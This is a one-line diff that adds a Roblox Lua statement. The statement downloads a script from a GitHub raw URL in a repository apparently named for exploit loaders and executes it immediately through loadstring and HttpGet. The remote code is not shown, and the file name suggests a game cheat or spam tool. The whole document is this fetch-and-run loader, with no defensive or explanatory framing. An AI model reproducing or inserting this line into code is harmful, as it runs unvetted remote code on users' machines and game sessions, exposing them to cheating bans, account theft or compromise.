@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/the-eternal-abyss-spam1-a2bktevzoavtpp.lua"))()
